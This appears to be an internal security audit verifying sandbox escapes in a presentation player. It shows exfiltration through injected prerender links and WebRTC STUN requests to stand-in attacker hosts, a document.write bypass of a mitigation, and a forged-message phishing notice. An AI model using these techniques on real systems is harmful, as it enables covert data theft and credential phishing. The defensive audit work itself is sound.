# V1 adversarial verification — security & player claims

Verifier working dir: `../prototypes/V1`
All experiments run against the repo's production build `dist` served read-only on ports 4660-4663, driven through the real Open-file / UI controls with Playwright. Browser: **full Chromium 158** (`chromium.launch({channel:'chromium'})`) unless stated. A1's harness was reused via a COPY (`lib-a1-copy.cjs`); nothing in A1/ or the repo was modified. Logs in `proto/V1/logs/*.json`.

## Summary verdicts
| Claim | Verdict |
|---|---|
| V1.1 prerender HTTP GET escape | **confirmed** (+ new inputs: file:// export, flags-removed, demo-sandbox) |
| V1.2 WebRTC STUN escape | **confirmed**; RTCPeerConnection-strip mitigation works |
| V1.3 editor isolation holds (my own 12+ probes) | **confirmed** |
| V1.4 focus bug + 3-line repair (shipped Slidev example) | **confirmed** |
| V1.5 Reveal hash:true kill + shim; F/S kill | **confirmed-with-caveats** (S only with RevealNotes) |
| V1.6 SW/blob-VFS behaviour | **not-tested** (non-starred; heavy harness; A1 logs exist) |
| V1.7 infinite-loop freeze difference | **not-tested** (non-starred; headless-shell literally hangs) |
| V1.8 forge ready/error + phishing notice | **confirmed** |
| V1.9 ?view=scroll/?print-pdf break preview; quantum Save PDF refused | **confirmed** |

---

## V1.1 — prerender HTTP GET escape  (log: v-prerender.json, v-flags.json, v-export.json, v-demo.json)
CONFIRMED. A dynamic `<link rel="prerender" href="http://host/?d=...">` inside a playing package triggers a real HTTP GET to the attacker host. Host still shows "Playing locally"; **no** securitypolicyviolation fires.
- **Exfil shape**: a 300-char payload rode out in a 311-char URL. Channel is **one-way, URL-bytes-only** (path+query); the prerendered response is not readable by the deck. Request carried `Sec-Purpose: prefetch`, `Sec-Fetch-Dest: document`, **no cookies**, no referer. Arbitrary bytes can be chunked across multiple links.
- **Governing browser setting**: Chromium's "Preload pages" preloading (NoStatePrefetch/prerender) — not toggleable through Playwright here, stated from platform knowledge, not re-measured.
- **Flags removed** (v-flags.json): launched with `ignoreDefaultArgs:['--disable-background-networking','--disable-background-timer-throttling','--disable-backgrounding-occluded-windows','--disable-renderer-backgrounding','--disable-ipc-flooding-protection']`. Prerender GET **still fired**. `preconnect` and `dns-prefetch` to a raw TCP listener produced **no connection** → those two channels do NOT demonstrably leak (answers A1 open question).
- **file:// standalone export** (v-export.json): the exported HTML opened from `file://` (origin null) → prerender GET received. Escape persists offline.
- **Mitigation attempts** (v-prerender.json): freezing `HTMLLinkElement.prototype.rel` setter + `Element.setAttribute` blocks `.rel=`/`setAttribute('rel',…)` (blocked=1, nothing received) **but is BYPASSED by `document.write('<link rel=prerender …>')`** — the HTML parser sets `rel` without the JS setter (GET /pr-docwrite received). No declarative CSP control stops it in Chromium 158 (`prefetch-src`/`navigate-to` unrecognized, per A1). Conclusion: not declaratively stoppable; only a no-script-execution / second-origin design or the browser's Preload-off setting closes it.

## V1.2 — WebRTC STUN escape  (log: v-webrtc.json)
CONFIRMED. `new RTCPeerConnection({iceServers:[{urls:'stun:host:port'}]})` + `createDataChannel` + `createOffer`/`setLocalDescription` emits UDP STUN Binding requests (4-5 datagrams observed) from inside the player; no CSP violation; host "Playing locally". The runner/prepared-doc CSP has **no `webrtc` directive** (unrecognized in 158) and `connect-src 'none'` does not gate ICE.
- **Exfil shape**: attacker-chosen `urls` host + `username`/`credential` fields carry bytes to the STUN/TURN server; server also learns client candidate IPs. Potentially **bidirectional** if attacker runs a TURN/ICE peer (I verified packets are SENT; a full data channel was not driven).
- **Mitigation** (v-webrtc.json): setting `window.RTCPeerConnection=undefined` (+ non-configurable defineProperty) in a pre-deck bootstrap blocks it (0 datagrams, "RTCPeerConnection is not a constructor"). **No same-realm bypass**: `frame-src 'none'` and `worker-src 'none'` in the prepared-doc CSP deny a fresh realm, so the constructor cannot be recovered. Unlike the prerender case, this mitigation is robust.

## V1.3 — editor isolation holds  (log: v-isolation3.json; combined-run v-isolation.json)
CONFIRMED with my OWN independent probe set (not A1's battery). Full Chromium. Results inside the player:
- cookie read/write → `SecurityError`; `top.document` → `SecurityError`; `parent.document` → `SecurityError`; `indexedDB.open('qft-markdown')` → `SecurityError`; `history.pushState`/`replaceState` → `SecurityError`; `window.open` → `null` (no popup event); `alert`/`confirm` → no-op (undefined/false), **host saw no dialog**; native `localStorage` is the isolated opaque-origin **shim** (length=1 for my own write, not the editor's store).
- fetch / XHR / WebSocket / external img / external CSS link / @font-face font / sendBeacon: each fires a fatal securitypolicyviolation (connect/img/style/font-src) and the **attacker HTTP server received NOTHING** for them.
- Only escapes: prerender GET received, WebRTC 4 STUN datagrams. Editor `.cm-editor` draft intact; no top navigation, no popups. Matches A1-F3.

## V1.4 — keyboard focus bug + repair  (log: v-focus.json)
CONFIRMED on the **shipped Slidev example** (`dist/slidev/interactive-physics.zip`). After Start the deck has `hasFocus:false`; two `ArrowRight` presses with no click leave the slide text unchanged ("A SMALL EXPERIMENT…"). Applying the 3-line repair from outside — `iframe.blur(); iframe.focus(); postMessage({type:'qft-presentation-focus',token})` — gives the deck focus (`hasFocus:true`), and the next `ArrowRight` advances the slide (text changes to "01 / THE IDEA Amplitudes add…"). Console shows `Permissions policy violation: focus-without-user-activation is not allowed`.

## V1.5 — Reveal hash:true kill + shim; F/S kill  (logs: v-reveal-hash.json, v-reveal-s.cjs run)
CONFIRMED-WITH-CAVEATS. Self-contained Reveal **6.0.2** deck (dist inlined, white theme, id-less first slide) fed through the real player:
- `hash:true`, no shim → "Playback needs attention", frame removed, notice: *"Failed to execute 'replaceState' on 'History': A history state object with URL '' cannot be created in a document with origin 'null' and URL 'blob:null/…'."* — CONFIRMED kill.
- Same deck with a 4-line `try/catch` wrapper around `History.prototype.replaceState`/`pushState` injected before Reveal → "Playing locally", frame alive. CONFIRMED shim fix. (Hash writes are swallowed, so the deck plays but the URL hash stays "".)
- **F key** on a running deck → kills it ("Disallowed by permissions policy"). CONFIRMED.
- **S key**: on a **plugin-less** deck S does **NOT** kill (stays "Playing locally"). With **RevealNotes loaded** (as the corpus AI decks do), S kills with *"Uncaught TypeError: Cannot set properties of null (setting 'marked')"*. CAVEAT: "S kills" is true only when the notes/speaker plugin is present.

## V1.6 — service worker / blob-VFS  — NOT TESTED
Non-starred, three-part platform claim needing a bespoke SW + blob-VFS harness (A1 exp9/exp17/exp17b). Out of prioritized budget; A1's logs exist and were not contradicted by anything observed here, but I did not independently reproduce, so no verdict.

## V1.7 — infinite-loop freeze difference — NOT TESTED
Non-starred. The chrome-headless-shell half of the claim literally hangs the renderer (A1 reports page.evaluate unanswered); re-running risks stalling this verifier. Deliberately skipped.

## V1.8 — forge ready/error + phishing notice  (log: v-forge.json)
CONFIRMED. A package that reads its own bootstrap token and posts `{qftPresentation:1,token,kind:'ready'}` drives the host to "Playing locally" at will; a later `{…,kind:'error',detail:<phish>}` is relayed by the runner and displayed **verbatim** in the editor's own notice bar: *"Your session expired. Sign in again at https://qft-login.example/restore to keep your drafts."* (`forgedTextShownVerbatim:true`). Attacker-controlled text (≤350 chars) in trusted editor chrome = phishing vector.

## V1.9 — preview breakage + Save-PDF refusal  (logs: v-f16.json, v-preview-pdf.json)
CONFIRMED (both parts).
- F16 (slides mode, `?example=quantum-slides` + query): `&view=scroll` → "Slides could not be loaded. Switch to Document and back…", `.reveal` gone. `&print-pdf` → pageerror *"Cannot read properties of null (reading 'appendChild')"*, `.reveal` gains `print-pdf`/`loading-scroll-mode`, preview broken. (Note: only reproduces when the embedded Reveal preview is active; the default document-mode page is unaffected.)
- F17: `?example=quantum-slides` → Slides mode → Save PDF → *"Slides 3, 5 contain too much content for the selected slide size. Split the content across slides or choose 4:3 before saving the PDF."* Production code `src/lib/export-slides.ts:275-279` (+3px overflow check). CONFIRMED.

## Extra finding — interactive-demo sandbox has the SAME two channels  (log: v-demo.json)
The `public/demo-sandbox.html` + `interactive-demo-runtime.ts` path shares the gap. A custom `interactive` fence whose script inserts a prerender link + RTCPeerConnection, run via the demo card's "Run demo": prerender GET received, 5 STUN datagrams. Its CSP (`default-src 'none'; … connect-src 'none'; frame-src 'none'; worker-src 'none'`, no webrtc/prefetch directive) is structurally identical to the presentation runner, so prerender + WebRTC escape there too. Prior audits focused only on the presentation player; this channel exists in the demo sandbox as well.
